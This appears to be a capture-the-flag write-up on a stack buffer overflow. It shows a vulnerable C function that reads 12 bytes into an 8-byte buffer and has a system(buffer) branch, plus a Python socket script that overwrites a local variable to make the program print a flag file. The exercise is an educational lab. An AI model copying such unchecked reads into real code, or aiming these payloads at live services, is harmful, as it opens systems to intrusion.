Buffer Overflow Exploitation on a C Program
Introduction

This write-up details the process of exploiting a buffer overflow vulnerability in a C program as part of a Capture The Flag (CTF) challenge. The challenge involved manipulating the value of a variable by overflowing a buffer in the program.
The Vulnerable Program

The C program provided for the challenge contained a function named play(). This function declared a buffer of size 8 bytes and two integer variables a and b. The function read 12 bytes of input into the 8-byte buffer, creating a buffer overflow vulnerability. Depending on the values of a and b, the function would perform different actions, including reading a file named "flag.0".

c code below:

int play() {

	int a;
	int b;
	char buffer[010];
	a = 0x41414141;
	b = 0x42424242;

	if (write(STDOUT_FILENO, "For a moment, nothing happened. Then, after a second or so, nothing continued to happen.\n> ", 91) < 0) {
		perror("write");
	}

	sleep(1);

    if (read(STDIN_FILENO, &buffer, 0xC) < 0) {
        perror("read");
    }
	
	if (a == 31337) {
		system(buffer);
	}

	else if (b == 42) {
		readfile("flag.0");
	}

	else if (b == 23) {
		readfile("vuln1.txt");
	}

	else {
		write(STDOUT_FILENO, "So long and thanks for all the fish.\n", 37);
	}

}

The Exploit

The goal of the challenge was to exploit the buffer overflow vulnerability to change the value of b to 42, causing the program to read the "flag.0" file.

To achieve this, a payload was constructed that consisted of 8 bytes to fill up the buffer, followed by 4 bytes to overwrite the value of b. The payload was sent to the program over a network connection.

Here's the Python script that was used to send the payload:

python

import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 1984))  # replace with the actual host and port

response = s.recv(1024)
print(response)

payload = b'A' * 8  # fill up the buffer
payload += struct.pack('<I', 42)  # overwrite b with 42 (little-endian)

s.send(payload)
response = s.recv(1024)
print(response)

Result

The script successfully exploited the buffer overflow vulnerability, causing the program to read the "flag.0" file and send the contents back over the network connection. The contents of the file were the flag for the CTF challenge: *REDACTED*.

Conclusion

This challenge demonstrated the dangers of buffer overflow vulnerabilities and the importance of proper input validation and buffer management in C programs.
